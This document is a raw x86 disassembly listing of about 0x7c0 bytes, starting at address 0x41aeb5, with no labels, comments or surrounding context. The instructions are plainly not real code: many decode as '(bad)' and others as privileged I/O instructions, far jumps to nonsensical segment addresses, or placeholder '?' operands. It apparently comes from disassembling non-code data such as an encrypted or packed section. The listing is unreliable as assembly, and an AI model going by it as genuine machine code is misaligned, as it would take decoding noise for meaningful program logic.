  41aeb5:	imul   BYTE PTR fs:[eax-0x69c9d17e]
  41aebc:	out    dx,eax
  41aebd:	push   eax
  41aebe:	mov    cl,0x29
  41aec0:	dec    edx
  41aec1:	cli    
  41aec2:	dec    esp
  41aec3:	lods   al,BYTE PTR ds:[esi]
  41aec4:	call   0x290b579
  41aec9:	daa    
  41aeca:	lock cdq 
  41aecc:	loop   0x41ae52
  41aece:	jp     0x41af18
  41aed0:	ins    DWORD PTR es:[edi],dx
  41aed1:	cmp    al,0xb8
  41aed3:	or     DWORD PTR [ebp-0x67e92657],0x5d
  41aeda:	mov    ah,0x21
  41aedc:	(bad)  
  41aedd:	jmp    0x41aec1
  41aedf:	push   edx
  41aee0:	lods   al,BYTE PTR ds:[esi]
  41aee1:	in     al,0x5f
  41aee3:	inc    edi
  41aee4:	mov    esp,DWORD PTR [edi+0x13eae486]
  41aeea:	and    DWORD PTR [eax-0x5e87f3b8],0xd432b718
  41aef4:	call   0x8c0c:0xafc463c0
  41aefb:	int    0x4e
  41aefd:	scas   eax,DWORD PTR es:[edi]
  41aefe:	pop    ecx
  41aeff:	dec    edx
  41af00:	push   0x2a
  41af02:	push   ecx
  41af03:	push   esi
  41af04:	push   eax
  41af05:	xchg   esi,eax
  41af06:	push   cs
  41af07:	jns    0x41aeb8
  41af09:	xor    eax,0x57ad99b3
  41af0e:	stos   BYTE PTR es:[edi],al
  41af0f:	jo     0x41aefd
  41af11:	test   DWORD PTR [edx+0x68],ebp
  41af14:	dec    ebp
  41af15:	ins    BYTE PTR es:[edi],dx
  41af16:	call   0x591f:0xa2546f3c
  41af1d:	xlat   BYTE PTR ds:[ebx]
  41af1e:	gs fwait
  41af20:	adc    BYTE PTR [ebp-0x75],bl
  41af23:	out    dx,eax
  41af24:	xor    eax,0x87914623
  41af29:	add    ecx,edi
  41af2b:	mov    bh,0x41
  41af2d:	or     BYTE PTR [eax],ch
  41af2f:	pop    esp
  41af30:	sub    cl,dh
  41af32:	pop    ecx
  41af33:	dec    edi
  41af34:	push   edx
  41af35:	repnz xchg bh,ah
  41af38:	xchg   ecx,eax
  41af39:	bound  esp,QWORD PTR [eax]
  41af3b:	inc    ebx
  41af3c:	cld    
  41af3d:	cmp    BYTE PTR ds:0x48241d70,dl
  41af43:	das    
  41af44:	xchg   ecx,eax
  41af45:	dec    eax
  41af46:	js     0x41aefa
  41af48:	and    DWORD PTR [esi+0x6fc98358],0xec3e93dd
  41af52:	jmp    0xffb04a5a
  41af57:	push   ss
  41af58:	or     eax,0x477f2928
  41af5d:	adc    al,0x48
  41af5f:	and    ebp,DWORD PTR [ecx+0x26]
  41af62:	ds nop
  41af64:	mov    esp,0x2d7058f1
  41af69:	inc    esi
  41af6a:	and    bh,al
  41af6c:	(bad)  
  41af6d:	mov    ebp,0xacd20e13
  41af72:	mov    edx,edx
  41af74:	in     al,0x6
  41af76:	fidivr WORD PTR [eax+0x763fb198]
  41af7c:	ss (bad) 
  41af7e:	imul   edi,DWORD PTR [ebx+0x6c],0xd52ca93
  41af85:	test   eax,0x873d6a46
  41af8a:	jecxz  0x41af5f
  41af8c:	or     ebp,DWORD PTR [eax]
  41af8e:	inc    ebx
  41af8f:	xchg   edi,eax
  41af90:	xchg   esp,ebx
  41af92:	aas    
  41af93:	mov    ds:0xccd9a08c,al
  41af98:	adc    bh,bl
  41af9a:	adc    ah,BYTE PTR [ebx]
  41af9c:	and    eax,DWORD PTR [ecx+0x27]
  41af9f:	xchg   dh,al
  41afa1:	(bad)  
  41afa2:	sar    BYTE PTR [edx-0x7f],1
  41afa5:	out    0x9f,eax
  41afa7:	push   0xfffffffc
  41afa9:	mov    dh,0xaf
  41afab:	cmc    
  41afac:	and    DWORD PTR [esi],0xffffffa0
  41afaf:	xlat   BYTE PTR ds:[ebx]
  41afb0:	in     eax,0xd0
  41afb2:	int    0xbd
  41afb4:	out    0xae,al
  41afb6:	inc    esi
  41afb7:	add    al,0xa2
  41afb9:	and    eax,0x6be6e4d4
  41afbe:	rcl    DWORD PTR [edx+0xc],1
  41afc1:	pop    ds
  41afc2:	int3   
  41afc3:	mov    bl,0x7
  41afc5:	xchg   BYTE PTR [ebp+0x57cd6964],dl
  41afcb:	mov    dl,0x3a
  41afce:	and    cl,BYTE PTR [edi]
  41afd0:	add    eax,0x57d0f1a6
  41afd5:	int    0xef
  41afd7:	jge    0x41afe4
  41afd9:	push   fs
  41afdb:	xor    eax,0x39b11f55
  41afe0:	shrd   DWORD PTR [ecx],ebx,0x91
  41afe4:	jg     0x41afed
  41afe6:	sbb    eax,0x77991dd1
  41afeb:	sbb    BYTE PTR [ebp-0x7275a747],cl
  41aff1:	pop    es
  41aff2:	push   ebp
  41aff3:	fst    DWORD PTR [esi*8-0x137b0c83]
  41affa:	dec    edx
  41affb:	dec    esp
  41affc:	xor    eax,0xf91047d
  41b001:	sbb    al,bl
  41b003:	rcl    eax,0xb8
  41b006:	fld    TBYTE PTR [esi+0x27]
  41b009:	mov    al,ds:0xa8071d1b
  41b00e:	lahf   
  41b00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b010:	push   es
  41b011:	dec    esp
  41b012:	pop    ebx
  41b013:	pop    esp
  41b014:	xchg   edx,eax
  41b015:	iret   
  41b016:	xchg   DWORD PTR [esp+edx*4],esi
  41b019:	or     ah,BYTE PTR [esp+ecx*1-0x61ce5d2a]
  41b020:	pop    ds
  41b021:	sub    eax,0xd0954fab
  41b026:	repz mov bl,0x98
  41b029:	mov    DWORD PTR [edx+0x11],ebp
  41b02c:	push   esp
  41b02d:	retf   
  41b02e:	dec    eax
  41b02f:	test   DWORD PTR ds:0xfa6d8070,esi
  41b035:	mov    ecx,0x48082f4a
  41b03a:	aad    0x97
  41b03c:	mov    al,0x59
  41b03e:	add    BYTE PTR [ecx],dl
  41b040:	fcom   st(6)
  41b042:	xor    al,0xc1
  41b044:	adc    DWORD PTR [ebp+0x2b],ebx
  41b047:	sbb    ch,ah
  41b049:	cld    
  41b04a:	jmp    0xd9f7867
  41b04f:	imul   BYTE PTR [edi-0x1bb8330c]
  41b055:	icebp  
  41b056:	lahf   
  41b057:	test   DWORD PTR [edi+0x69],edi
  41b05a:	or     eax,0x80f0c286
  41b05f:	ins    BYTE PTR es:[edi],dx
  41b060:	test   eax,0xe49675e8
  41b065:	mov    dl,0x7e
  41b067:	in     al,0x22
  41b069:	aad    0x22
  41b06b:	cmp    bl,dh
  41b06d:	push   esi
  41b06e:	jl     0x41b080
  41b070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b071:	pushf  
  41b072:	pop    ecx
  41b073:	into   
  41b074:	xor    al,0xe9
  41b076:	popa   
  41b077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b078:	inc    ecx
  41b079:	test   eax,0x149c104b
  41b07e:	loop   0x41b071
  41b080:	call   0x77d26124
  41b085:	out    0xb9,eax
  41b087:	aad    0x6e
  41b089:	(bad)  
  41b08a:	mov    edi,0x7e02b56c
  41b08f:	cmp    al,0xf0
  41b091:	mov    cl,BYTE PTR [esi-0x2ea0c9e3]
  41b097:	push   edx
  41b098:	out    0x83,eax
  41b09a:	inc    ebp
  41b09b:	repz ror edx,cl
  41b09e:	ds jp  0x41b0c3
  41b0a1:	or     eax,0x60423626
  41b0a6:	mov    al,0x28
  41b0a8:	shl    DWORD PTR [eax+0x51],0x72
  41b0ac:	inc    ebp
  41b0ad:	jbe    0x41b11a
  41b0af:	jne    0x41b10d
  41b0b1:	call   0x9024:0xee91adef
  41b0b8:	neg    BYTE PTR [esi-0x2e]
  41b0bb:	ins    BYTE PTR es:[edi],dx
  41b0bc:	dec    BYTE PTR [ecx+esi*2+0x26566dc4]
  41b0c3:	fs pop ss
  41b0c5:	jno    0x41b113
  41b0c7:	int    0xd3
  41b0c9:	mov    ah,0x18
  41b0cb:	inc    edi
  41b0cc:	in     eax,dx
  41b0cd:	jnp    0x41b07c
  41b0cf:	mov    WORD PTR [ecx],fs
  41b0d1:	frstor [ebp+0x1d35ad54]
  41b0d7:	repz popf 
  41b0d9:	sar    BYTE PTR [ebx+0x3ad48ca8],0x6
  41b0e0:	inc    esi
  41b0e1:	jmp    0x7c44:0xc6d41631
  41b0e8:	sub    dh,0x83
  41b0eb:	or     edi,DWORD PTR [eax+0x39530348]
  41b0f1:	lods   eax,DWORD PTR ds:[esi]
  41b0f2:	mov    esp,0x3d459298
  41b0f7:	fild   QWORD PTR [ebx]
  41b0f9:	pusha  
  41b0fa:	iret   
  41b0fb:	jo     0x41b122
  41b0fd:	sti    
  41b0fe:	jmp    0x41b083
  41b100:	stos   DWORD PTR es:[edi],eax
  41b101:	(bad)  
  41b102:	(bad)  
  41b103:	cld    
  41b104:	jl     0x41b086
  41b106:	sub    al,0xdd
  41b108:	ja     0x41b162
  41b10a:	out    dx,al
  41b10b:	data16 sub al,0xc
  41b10e:	mov    ss,WORD PTR [ebp+0x49]
  41b111:	outs   dx,DWORD PTR ds:[esi]
  41b112:	inc    esp
  41b113:	jecxz  0x41b16f
  41b115:	jnp    0x41b098
  41b117:	dec    ebp
  41b118:	inc    edi
  41b119:	clc    
  41b11a:	ss and ebx,eax
  41b11d:	xor    BYTE PTR ss:[eax+ecx*4-0x1ab6e523],ah
  41b125:	add    eax,0x84f72ed3
  41b12a:	xor    bh,BYTE PTR [edi+0x51a912a0]
  41b130:	popf   
  41b131:	loopne 0x41b153
  41b133:	adc    ebx,DWORD PTR [eax+0x33]
  41b136:	ret    0xf78d
  41b139:	push   cs
  41b13a:	adc    al,0xcb
  41b13c:	mov    al,ds:0x647fe611
  41b141:	or     eax,0x10b8642e
  41b146:	pop    ebx
  41b147:	lds    esp,FWORD PTR [ebx-0x715ded]
  41b14d:	add    BYTE PTR [bx+si],al
  41b150:	add    BYTE PTR [eax],al
  41b152:	cld    
  41b153:	es out dx,eax
  41b155:	mov    eax,ds:0x7ffee9ff
  41b15a:	jmp    edx
  41b15c:	fdivp  st(6),st
  41b15e:	test   al,0x9b
  41b160:	jae    0x41b0f8
  41b162:	mov    eax,ds:0xf400012d
  41b167:	add    al,0x0
  41b169:	add    al,ah
  41b16b:	imul   edi,DWORD PTR [ecx-0x45c2f15b]
  41b172:	ins    DWORD PTR es:[edi],dx
  41b173:	cs cmp eax,ecx
  41b176:	or     BYTE PTR [ebp-0x2a05b28e],ch
  41b17c:	xchg   esi,eax
  41b17d:	data16 test al,0x8e
  41b180:	sar    BYTE PTR [eax+0x160966e3],0x6
  41b187:	pop    eax
  41b188:	out    dx,eax
  41b189:	enter  0xacfc,0x39
  41b18d:	bound  esi,QWORD PTR [ebp-0x23]
  41b190:	or     eax,0x1c7ce159
  41b195:	pavgw  mm7,QWORD PTR [esi+0x22703a6a]
  41b19c:	sbb    DWORD PTR [edx+ebp*2+0x1d],ecx
  41b1a0:	cmp    BYTE PTR [esi-0x25],bl
  41b1a3:	mov    al,0x12
  41b1a5:	std    
  41b1a6:	jge    0x41b20e
  41b1a8:	or     DWORD PTR [eax],esi
  41b1aa:	jns    0x41b1c5
  41b1ac:	std    
  41b1ad:	jge    0x41b1a6
  41b1af:	ins    BYTE PTR es:[edi],dx
  41b1b0:	fcomip st,st(0)
  41b1b2:	aad    0x27
  41b1b4:	jbe    0x41b1ae
  41b1b6:	cdq    
  41b1b7:	mov    ebx,0x6d81de64
  41b1bc:	out    0x85,eax
  41b1be:	inc    eax
  41b1bf:	aas    
  41b1c0:	xchg   edx,eax
  41b1c1:	xchg   esp,eax
  41b1c2:	sub    al,0xaf
  41b1c4:	push   edx
  41b1c5:	mov    cl,0x53
  41b1c7:	sti    
  41b1c8:	fwait
  41b1c9:	dec    ecx
  41b1ca:	jecxz  0x41b160
  41b1cc:	ds loope 0x41b14f
  41b1cf:	lods   eax,DWORD PTR ds:[esi]
  41b1d0:	xor    bh,BYTE PTR [eax-0x2b0e3c17]
  41b1d6:	retf   
  41b1d7:	xor    edi,edx
  41b1d9:	aad    0x34
  41b1db:	in     eax,dx
  41b1dc:	jbe    0x41b188
  41b1de:	fnstsw WORD PTR [eax+0x4bba8cbc]
  41b1e4:	sub    BYTE PTR [eax],bl
  41b1e6:	fnsave [edx+0x5fd08c7c]
  41b1ec:	push   0xc5596dce
  41b1f1:	gs jno 0x41b174
  41b1f4:	sbb    al,0x2b
  41b1f6:	pop    esi
  41b1f7:	rol    DWORD PTR [edx+0x716ca8a6],0xae
  41b1fe:	xchg   esi,eax
  41b1ff:	add    eax,0xfe53f1c0
  41b204:	mov    ebp,0x230b9dba
  41b209:	xor    DWORD PTR [ecx],edx
  41b20b:	f2xm1  
  41b20d:	in     eax,0xb4
  41b20f:	push   es
  41b210:	sbb    eax,0xaef174eb
  41b215:	mov    ds:0xb3f9c077,al
  41b21a:	jmp    0x2baa:0x987799b4
  41b221:	mov    bl,0x15
  41b223:	fistp  DWORD PTR [ecx+0x5ddf7a94]
  41b229:	test   ecx,0xf926783d
  41b22f:	aas    
  41b230:	and    edx,edx
  41b232:	dec    ebp
  41b233:	es mov dl,0x60
  41b236:	mov    ebp,?
  41b238:	mov    esi,0x6f82336e
  41b23d:	xchg   edi,eax
  41b23e:	sbb    BYTE PTR [eax],al
  41b240:	add    ax,0x688f
  41b244:	jmp    0x9d9226c0
  41b249:	and    BYTE PTR [ebp+0x18],al
  41b24c:	xor    BYTE PTR [ebp+0x64],cl
  41b24f:	cmp    eax,0xe05efab9
  41b254:	inc    DWORD PTR [edx+0x58f4b8ed]
  41b25a:	xlat   BYTE PTR ds:[ebx]
  41b25b:	pop    es
  41b25c:	add    edx,esp
  41b25e:	fcom   DWORD PTR [edi-0x6d790fbb]
  41b264:	and    eax,0x87c92d71
  41b269:	cmp    DWORD PTR [ebx],esp
  41b26b:	jmp    0xebc45279
  41b270:	dec    esi
  41b271:	add    esp,DWORD PTR cs:[eax]
  41b274:	xchg   edx,eax
  41b275:	test   DWORD PTR [ebx+0x45],esp
  41b278:	fwait
  41b279:	pop    eax
  41b27a:	adc    eax,0x2733e472
  41b27f:	add    eax,0x6c83f9a6
  41b284:	xchg   esp,eax
  41b285:	mov    al,ah
  41b287:	mov    ecx,0x4b609990
  41b28c:	ja     0x41b260
  41b28e:	pop    ss
  41b28f:	mul    DWORD PTR [edx-0x6ed7d6c0]
  41b295:	and    eax,0xa93ada54
  41b29a:	sub    bh,BYTE PTR ds:0x387edb41
  41b2a0:	jg     0x41b2b8
  41b2a2:	test   eax,0x4557d716
  41b2a7:	pop    ecx
  41b2a8:	ss push edx
  41b2aa:	sbb    DWORD PTR ds:0x5456916e,eax
  41b2b0:	pop    es
  41b2b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2b2:	mov    al,0x4c
  41b2b4:	jge    0x41b2a5
  41b2b6:	mov    esp,0x9808e910
  41b2bb:	mov    esi,0xe7f2f181
  41b2c0:	out    0xd4,eax
  41b2c2:	sbb    al,0xa
  41b2c4:	jmp    0x41b28d
  41b2c6:	imul   edi,DWORD PTR [edi-0x5637dc56],0x4c0d2671
  41b2d0:	sti    
  41b2d1:	(bad)  
  41b2d2:	adc    eax,0x97154e7d
  41b2d7:	idiv   ch
  41b2d9:	in     eax,0x54
  41b2db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2dc:	fs in  eax,0x16
  41b2df:	aaa    
  41b2e0:	add    ebp,DWORD PTR [ebx]
  41b2e2:	fs mov bh,0xdf
  41b2e5:	fs je  0x41b322
  41b2e8:	mov    edi,DWORD PTR [edx+0x38]
  41b2eb:	mov    bh,0xdf
  41b2ed:	sub    esp,ebp
  41b2ef:	add    esi,DWORD PTR [esi-0x29]
  41b2f2:	nop
  41b2f3:	mov    fs,edx
  41b2f5:	(bad)  [ecx+0x12]
  41b2f8:	cli    
  41b2f9:	in     eax,dx
  41b2fa:	rol    ecx,1
  41b2fc:	jl     0x41b2eb
  41b2fe:	stc    
  41b2ff:	jne    0x41b35b
  41b301:	or     BYTE PTR [ebx+0x48],bh
  41b304:	and    BYTE PTR [ebx],ch
  41b306:	(bad)  
  41b307:	pop    edx
  41b308:	je     0x41b31c
  41b30a:	mov    al,ds:0x8b5ad34a
  41b30f:	int3   
  41b310:	je     0x41b35a
  41b312:	inc    eax
  41b313:	mov    ecx,0x8cbd03f5
  41b318:	sub    ebx,DWORD PTR [ebx]
  41b31a:	ficomp WORD PTR [ecx-0x4cbca091]
  41b320:	mov    esp,0x511ad729
  41b325:	sub    BYTE PTR [eax+eax*1-0x1b91a2d4],0xa4
  41b32d:	call   0x9ab7:0xb34de4c1
  41b334:	call   0xcd1da0dc
  41b339:	push   0xb4cfab13
  41b33e:	or     al,0x68
  41b340:	mov    ds:0x175525e9,eax
  41b345:	popf   
  41b346:	lahf   
  41b347:	sub    eax,0xfb7a6f07
  41b34c:	pushf  
  41b34d:	test   DWORD PTR [esi+0x10],esp
  41b350:	push   esp
  41b351:	xchg   esp,eax
  41b352:	dec    ebp
  41b353:	fisttp DWORD PTR [edi]
  41b355:	add    bh,BYTE PTR [esi+0x74]
  41b358:	inc    cx
  41b35a:	pop    eax
  41b35b:	(bad)  
  41b35c:	pushf  
  41b35d:	jae    0x41b3de
  41b35f:	lods   eax,DWORD PTR ds:[esi]
  41b360:	loop   0x41b311
  41b362:	jp     0x41b379
  41b364:	out    0x99,eax
  41b366:	cmp    al,0x79
  41b368:	or     eax,0xb4b4b9b
  41b36d:	push   0x91714bce
  41b372:	(bad)  
  41b373:	and    eax,0xdefffbc9
  41b378:	mov    eax,ds:0x220b5775
  41b37d:	ins    BYTE PTR es:[edi],dx
  41b37e:	adc    BYTE PTR [ecx],bl
  41b380:	or     DWORD PTR [ecx+eax*2+0x25],0x70
  41b385:	dec    esi
  41b386:	in     al,0x2f
  41b388:	mov    ch,0x0
  41b38a:	cdq    
  41b38b:	dec    esi
  41b38c:	fidiv  WORD PTR [edx+0x76]
  41b38f:	xchg   ebp,eax
  41b390:	idiv   BYTE PTR [eax]
  41b392:	jns    0x41b315
  41b394:	aam    0x68
  41b396:	add    al,0x2b
  41b398:	rcl    BYTE PTR ds:0xac05abb5,1
  41b39e:	cwde   
  41b39f:	dec    esp
  41b3a0:	dec    esi
  41b3a1:	cwde   
  41b3a2:	push   edx
  41b3a3:	ss ret 
  41b3a5:	push   esp
  41b3a6:	cdq    
  41b3a7:	add    DWORD PTR [eax],ebp
  41b3a9:	lock lock jle 0x41b425
  41b3ad:	stos   DWORD PTR es:[edi],eax
  41b3ae:	push   es
  41b3af:	xor    al,0x36
  41b3b1:	out    dx,eax
  41b3b2:	ret    0xaded
  41b3b5:	jmp    0xfa22:0x779ab855
  41b3bc:	mov    edx,0x675c5761
  41b3c1:	aas    
  41b3c2:	mov    dl,dh
  41b3c4:	xor    DWORD PTR [edx+ebx*2+0x3b2d7600],edi
  41b3cb:	and    al,cl
  41b3cd:	mov    DWORD PTR [esp+eiz*2-0x73],0xdcb2074c
  41b3d5:	pop    edx
  41b3d6:	add    ecx,ebx
  41b3d8:	je     0x41b426
  41b3da:	and    ebp,DWORD PTR [eax+0x4a]
  41b3dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3de:	sub    ecx,esi
  41b3e0:	push   esi
  41b3e1:	stc    
  41b3e2:	int3   
  41b3e3:	aad    0x96
  41b3e5:	xchg   ecx,eax
  41b3e6:	ss fs sbb ch,bl
  41b3ea:	test   BYTE PTR [esi+edi*2],bh
  41b3ed:	pop    esi
  41b3ee:	sub    ch,BYTE PTR [edx-0x2cf00a0e]
  41b3f4:	mov    al,0xb3
  41b3f6:	outs   dx,BYTE PTR ds:[esi]
  41b3f7:	in     al,dx
  41b3f8:	loop   0x41b3a5
  41b3fa:	pop    eax
  41b3fb:	addr16 push esp
  41b3fd:	leave  
  41b3fe:	neg    DWORD PTR [eax]
  41b400:	iret   
  41b401:	and    DWORD PTR [edi-0x11],0x4f
  41b405:	sbb    DWORD PTR [ebp+ecx*8-0x36],edx
  41b409:	or     ch,BYTE PTR [ecx-0x46]
  41b40c:	jp     0x41b42d
  41b40e:	retf   
  41b40f:	fistp  QWORD PTR [ebp-0x76]
  41b412:	mov    ebx,0x5c7e3057
  41b417:	out    dx,eax
  41b418:	aas    
  41b419:	es pop ecx
  41b41b:	mov    dl,0x17
  41b41d:	arpl   WORD PTR [ebx+0x45cf56a1],bx
  41b423:	std    
  41b424:	scas   al,BYTE PTR es:[edi]
  41b425:	xchg   edi,eax
  41b426:	cli    
  41b427:	inc    edi
  41b428:	icebp  
  41b429:	pushf  
  41b42a:	ins    DWORD PTR es:[edi],dx
  41b42b:	cmp    BYTE PTR [eax],0x36
  41b42e:	call   0x5c3a:0x7acf3c28
  41b435:	mov    ?,WORD PTR [ebx-0x5e6caa7e]
  41b43b:	xchg   edi,eax
  41b43c:	(bad)  
  41b43d:	sub    ch,BYTE PTR [ecx-0x66]
  41b440:	aam    0xb9
  41b442:	jno    0x41b463
  41b444:	mov    al,0x26
  41b446:	(bad)  
  41b447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b448:	dec    edi
  41b449:	ret    0xcf25
  41b44c:	dec    ebx
  41b44d:	pop    esp
  41b44e:	(bad)  
  41b44f:	mov    eax,0xbd5f25b0
  41b454:	inc    edx
  41b455:	mov    dh,0x79
  41b457:	aaa    
  41b458:	mov    al,ds:0xcff9602
  41b45d:	retf   
  41b45e:	xlat   BYTE PTR ds:[ebx]
  41b45f:	out    0x48,eax
  41b461:	push   eax
  41b462:	iret   
  41b463:	bound  ebx,QWORD PTR [edx+0x7a]
  41b466:	jl     0x41b498
  41b468:	jmp    0x41b40c
  41b46a:	jb     0x41b479
  41b46c:	leave  
  41b46d:	cmc    
  41b46e:	pop    ecx
  41b46f:	retf   
  41b470:	xor    ebx,DWORD PTR [edx]
  41b472:	sbb    BYTE PTR [ebp-0xb],ah
  41b475:	xlat   BYTE PTR ds:[ebx]
  41b476:	int    0x61
  41b478:	inc    ecx
  41b479:	int    0x97
  41b47b:	cmp    al,0x23
  41b47d:	sahf   
  41b47e:	cdq    
  41b47f:	rol    DWORD PTR [ebx],cl
  41b481:	xor    BYTE PTR [edx+0x11],0x7b
  41b485:	neg    ah
  41b487:	popa   
  41b488:	retf   0x3168
  41b48b:	mov    ah,0xed
  41b48d:	mov    ebx,0x32674375
  41b492:	nop
  41b493:	repnz popa 
  41b495:	or     BYTE PTR [ecx-0x5fd510f6],al
  41b49b:	pop    eax
  41b49c:	cmp    BYTE PTR [eiz*8+0x3d9f2689],0xb3
  41b4a4:	xchg   ebp,eax
  41b4a5:	popf   
  41b4a6:	mov    al,ah
  41b4a8:	ror    ecx,cl
  41b4aa:	in     eax,dx
  41b4ab:	in     eax,dx
  41b4ac:	je     0x41b4b6
  41b4ae:	adc    ah,dl
  41b4b0:	inc    edi
  41b4b1:	shl    ecx,0x8a
  41b4b4:	and    BYTE PTR [edi],cl
  41b4b6:	inc    edi
  41b4b7:	(bad)  
  41b4b8:	adc    dh,BYTE PTR [eax-0x2e067983]
  41b4be:	rol    esi,0x7a
  41b4c1:	jl     0x41b538
  41b4c3:	sub    al,dl
  41b4c5:	mov    eax,0xd2a61048
  41b4ca:	dec    edi
  41b4cb:	mov    dl,0x47
  41b4cd:	inc    ebp
  41b4ce:	mov    ?,WORD PTR [esi+edx*8+0x72]
  41b4d2:	dec    edi
  41b4d3:	stos   BYTE PTR es:[edi],al
  41b4d4:	shr    DWORD PTR [esi-0x4c],0x7c
  41b4d8:	sbb    DWORD PTR [edi+0x61fb9823],0xffffffca
  41b4df:	fstp   QWORD PTR [eax+0x3349399f]
  41b4e5:	mov    edi,0x4784b3e4
  41b4ea:	push   edi
  41b4eb:	push   ss
  41b4ec:	retf   
  41b4ed:	popf   
  41b4ee:	sti    
  41b4ef:	das    
  41b4f0:	sub    ah,ah
  41b4f2:	ins    DWORD PTR es:[edi],dx
  41b4f3:	lea    edi,[edx-0x47b9dad5]
  41b4f9:	neg    DWORD PTR [ebx-0x51]
  41b4fc:	cwde   
  41b4fd:	inc    ecx
  41b4fe:	mov    ds:0x2b37d9ee,eax
  41b503:	ins    BYTE PTR es:[edi],dx
  41b504:	daa    
  41b505:	rol    BYTE PTR ds:0x2ca92adc,1
  41b50b:	xor    BYTE PTR [ecx+ebp*2],ah
  41b50e:	jno    0x41b4c4
  41b510:	jo     0x41b4b8
  41b512:	enter  0x8a11,0xd8
  41b516:	mov    ds:0x8e3b056a,al
  41b51b:	in     al,0x52
  41b51d:	jo     0x41b508
  41b51f:	popa   
  41b520:	inc    edi
  41b521:	loope  0x41b57d
  41b523:	fcmovne st,st(4)
  41b525:	std    
  41b526:	inc    eax
  41b527:	mov    ebx,0xf01a996e
  41b52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b52d:	cmp    BYTE PTR [edi-0x3b791574],bh
  41b533:	mov    ebx,0x808e687c
  41b538:	push   edi
  41b539:	daa    
  41b53a:	mov    eax,0xc7dcbacd
  41b53f:	xchg   esi,eax
  41b540:	adc    ebp,edx
  41b542:	xchg   edx,eax
  41b543:	arpl   WORD PTR [edi],dx
  41b545:	std    
  41b546:	sub    ch,bl
  41b548:	add    edi,eax
  41b54a:	retf   0xed88
  41b54d:	sbb    ebp,DWORD PTR [ecx]
  41b54f:	call   0x4ce4c626
  41b554:	and    DWORD PTR [ebp-0x49101bd4],ecx
  41b55a:	mov    DWORD PTR [edx],ebp
  41b55c:	xor    al,0xa5
  41b55e:	cmc    
  41b55f:	and    DWORD PTR [edx],esi
  41b561:	xchg   esp,eax
  41b562:	dec    esi
  41b563:	pop    ebp
  41b564:	in     eax,0xa0
  41b566:	out    dx,eax
  41b567:	jmp    0xfca98dae
  41b56c:	inc    esp
  41b56d:	out    dx,al
  41b56e:	sub    bh,0x52
  41b571:	push   cs
  41b572:	or     dl,ch
  41b574:	push   0x6
  41b576:	inc    ecx
  41b577:	in     eax,dx
  41b578:	test   BYTE PTR [eax-0x2e],dh
  41b57b:	mov    fs,WORD PTR cs:[edx-0xad0b859]
  41b582:	cwde   
  41b583:	lods   al,BYTE PTR ds:[esi]
  41b584:	cwde   
  41b585:	push   es
  41b586:	jecxz  0x41b5dc
  41b588:	in     al,0x94
  41b58a:	js     0x41b5d6
  41b58c:	or     ebx,DWORD PTR fs:[edi+0x6c342e53]
  41b593:	and    DWORD PTR [esi-0x19d4cc52],0xfffffff8
  41b59a:	and    DWORD PTR [esi],edx
  41b59c:	add    ebx,DWORD PTR ds:[ebp+0x151f4d3b]
  41b5a3:	std    
  41b5a4:	sbb    bl,BYTE PTR [esp+eax*2+0x57bd159e]
  41b5ab:	jo     0x41b61f
  41b5ad:	outs   dx,BYTE PTR ds:[esi]
  41b5ae:	pop    es
  41b5af:	add    BYTE PTR [esi+0x26883cd0],dh
  41b5b5:	stos   DWORD PTR es:[edi],eax
  41b5b6:	sub    BYTE PTR [edx-0x45b2625c],dh
  41b5bc:	cmp    eax,0xd674bad7
  41b5c1:	iret   
  41b5c2:	push   ss
  41b5c3:	mov    WORD PTR [edx+edx*4],?
  41b5c6:	mov    esi,0xcc2c5e8c
  41b5cb:	cmc    
  41b5cc:	retf   
  41b5cd:	(bad)  [eax+0x6f8bf950]
  41b5d3:	and    ecx,DWORD PTR [esi-0x7bdc9b94]
  41b5d9:	xor    al,0x1
  41b5db:	ror    BYTE PTR [edx-0x5674197d],1
  41b5e1:	fsubr  DWORD PTR [esi-0xf40502e]
  41b5e7:	in     al,dx
  41b5e8:	into   
  41b5e9:	clc    
  41b5ea:	xchg   esp,eax
  41b5eb:	adc    edi,ebp
  41b5ed:	jb     0x41b645
  41b5ef:	test   bh,bh
  41b5f1:	mov    ebp,0x4334286b
  41b5f6:	cmp    edi,DWORD PTR [ebp-0x5f]
  41b5f9:	loop   0x41b660
  41b5fb:	sbb    DWORD PTR [ebx],edx
  41b5fd:	pop    edx
  41b5fe:	add    eax,DWORD PTR [edi-0x62]
  41b601:	xchg   edi,eax
  41b602:	sbb    al,0xbc
  41b604:	cmp    al,BYTE PTR [edi-0x7b4cb705]
  41b60a:	clc    
  41b60b:	popa   
  41b60c:	xor    ecx,DWORD PTR [ecx+0x26]
  41b60f:	je     0x41b5a1
  41b611:	jl     0x41b644
  41b613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b614:	pop    ebx
  41b615:	pop    eax
  41b616:	(bad)  [edx+0x615665]
  41b61c:	mov    dl,0x63
  41b61e:	sub    DWORD PTR [ebp+eax*2-0x14],edi
  41b622:	pop    esp
  41b623:	jle    0x41b600
  41b625:	mov    ecx,ss
  41b627:	mov    WORD PTR [ecx],es
  41b629:	clc    
  41b62a:	push   ds
  41b62b:	pop    ds
  41b62c:	and    DWORD PTR [edi+0x33],edx
  41b62f:	push   esi
  41b630:	and    eax,0x169ffdf7
  41b635:	and    ebx,DWORD PTR [edi]
  41b637:	adc    bl,bh
  41b639:	ds retf 0xcca
  41b63d:	sbb    eax,0x5ef3bfc5
  41b642:	dec    edi
  41b643:	cmp    DWORD PTR [ebx+ecx*4-0x21],ecx
  41b647:	mov    edi,0x39e9e2c7
  41b64c:	jmp    0x7856e98
  41b651:	inc    eax
  41b652:	call   0xd377b317
  41b657:	xchg   BYTE PTR [ebx],bh
  41b659:	cdq    
  41b65a:	sbb    ch,BYTE PTR ds:0x77ef
  41b660:	add    BYTE PTR [eax],al
  41b662:	(bad)  
  41b663:	aaa    
  41b664:	sti    
  41b665:	addr16 sti 
  41b667:	out    dx,eax
  41b668:	fidiv  WORD PTR [edi-0x5c01975c]
  41b66e:	popf   
  41b66f:	add    ah,BYTE PTR [edx+ebx*4-0x6b]
  41b673:	xor    al,BYTE PTR [ecx]
